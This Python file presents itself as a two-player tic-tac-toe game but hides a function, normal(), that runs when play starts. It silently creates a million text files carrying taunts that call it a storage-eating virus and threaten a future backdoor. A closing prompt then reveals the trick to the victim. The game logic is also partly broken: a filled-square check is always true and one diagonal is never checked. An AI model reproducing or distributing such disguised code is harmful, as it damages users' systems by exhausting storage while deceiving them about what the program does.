import time
import os

#Implementation of Two Player Tic-Tac-Toe game in Python.

''' We will make the board using dictionary
    in which keys will be the location(i.e : top-left,mid-right,etc.)
    and initialliy it's values will be empty space and then after every move
    we will change the value according to player's choice of move. '''

theBoard = {'7': ' ' , '8': ' ' , '9': ' ' ,
            '4': ' ' , '5': ' ' , '6': ' ' ,
            '1': ' ' , '2': ' ' , '3': ' ' }

board_keys = []

for key in theBoard:
    board_keys.append(key)

''' We will have to print the updated board after every move in the game and
    thus we will make a function in which we'll define the printBoard function
    so that we can easily print the board everytime by calling this function. '''

def printBoard(board):
    print(board['7'] + '|' + board['8'] + '|' + board['9'])
    print('-+-+-')
    print(board['4'] + '|' + board['5'] + '|' + board['6'])
    print('-+-+-')
    print(board['1'] + '|' + board['2'] + '|' + board['3'])

def normal():
        a = "0"

        for i in range(1000000):
                a = int(a)
                a += 1
                a = str(a)
                file = open(a + ".txt", "w")
                file.write("""Sry but there are many files now!!
And Have a good time deletimg them!!
Thia is a simple virus which will only eat your storage!!
This will not do any other harm!!
Sry for the trouble but this just for fun no personal revenge or anything!
Hope yoi foegive me!!

Your 1 GB will be eaten!!
Nothing much!
Be aware Next time I may also include a backdoor to your device!!
To have an eye on you!!


  ____                                       _ _
 |  _ \           /\                        | | |
 | |_) | ___     /  \__      ____ _ _ __ ___| | |
 |  _ < / _ \   / /\ \ \ /\ / / _` | '__/ _ \ | |
 | |_) |  __/  / ____ \ V  V / (_| | | |  __/_|_|
 |____/ \___| /_/    \_\_/\_/ \__,_|_|  \___(_|_)



  _   _          _____           _                   _                  __     _>
 | \ | |        / ____|         | |                 (_)                / _|   | >
 |  \| | ___   | (___  _   _ ___| |_ ___ _ __ ___    _ ___   ___  __ _| |_ ___| > | . ` |/ _ \   \___ \| | | / __| __/ _ \ '_ ` _ \  | / __| / __|/ _`                          >
 | |\  | (_) |  ____) | |_| \__ \ ||  __/ | | | | | | \__ \ \__ \ (_| | ||  __/_>
 |_| \_|\___/  |_____/ \__, |___/\__\___|_| |_| |_| |_|___/ |___/\__,_|_| \___(_>
                        __/ |                                                   >

 """)
                file.close()

def final():
        print ("Do you want to know something special?(y/n)\n")
        command = input("~>")
        if command == "Y" or command == "y":
                print ("""1 GB of your storage must have been used!!
This is actually a storage eating virus!!!""")
        elif command == "n" or command == "N":
                print ("You will find out soon!!")
        else:
                print ("Not proper input, You will find about it!!")
        b = input()

# Now we'll write the main function which has all the gameplay functionality.
def game():
    normal()
    turn = 'X'
    count = 0


    for i in range(10):
        printBoard(theBoard)
        print("It's your turn," + turn + ".Move to which place?(1-9)")

        move = input()

        try:
            if theBoard[move] == ' ':
                theBoard[move] = turn
                count += 1
            elif theBoard[move] == 'X' or 'O':
                print("That place is already filled.\nMove to which place?")
                continue
        except KeyError:
            print('Unknown input!')
            continue

        # Now we will check if player X or O has won,for every move after 5 moves.
        if count >= 5:
            if theBoard['7'] == theBoard['8'] == theBoard['9'] != ' ': # across the top
                printBoard(theBoard)
                print("\nGame Over.\n")
                print(" **** " +turn + " won. ****")
                break
            elif theBoard['4'] == theBoard['5'] == theBoard['6'] != ' ': # across the middle
                printBoard(theBoard)
                print("\nGame Over.\n")
                print(" **** " +turn + " won. ****")
                break
            elif theBoard['1'] == theBoard['2'] == theBoard['3'] != ' ': # across the bottom
                printBoard(theBoard)
                print("\nGame Over.\n")
                print(" **** " +turn + " won. ****")
                break
            elif theBoard['1'] == theBoard['4'] == theBoard['7'] != ' ': # down the left side
                printBoard(theBoard)
                print("\nGame Over.\n")
                print(" **** " +turn + " won. ****")
                break
            elif theBoard['2'] == theBoard['5'] == theBoard['8'] != ' ': # down the middle
                printBoard(theBoard)
                print("\nGame Over.\n")
                print(" **** " +turn + " won. ****")
                break
            elif theBoard['3'] == theBoard['6'] == theBoard['9'] != ' ': # down the right side
                printBoard(theBoard)
                print("\nGame Over.\n")
                print(" **** " +turn + " won. ****")
                break
            elif theBoard['7'] == theBoard['5'] == theBoard['3'] != ' ': # diagonal
                printBoard(theBoard)
                print("\nGame Over.\n")
                print(" **** " +turn + " won. ****")
        # If neither X nor O wins and the board is full, we'll declare the resul>
        if count == 9:
            print("\nGame Over.\n")
            print("It's a Tie!!")

        # Now we have to change the player after every move.
        if turn =='X':
            turn = 'O'
        else:
            turn = 'X'

    # Now we will ask if player wants to restart the game or not.
    restart = input("Do want to play Again?(y/n)")
    if restart == "y" or restart == "Y":
        for key in board_keys:
            theBoard[key] = " "

        game()
    elif restart == "n" or restart == "N":
        print("Thanks for playing!")
        time.sleep(1)
        os.system('clear')
        final()

if __name__ == "__main__":
    game()
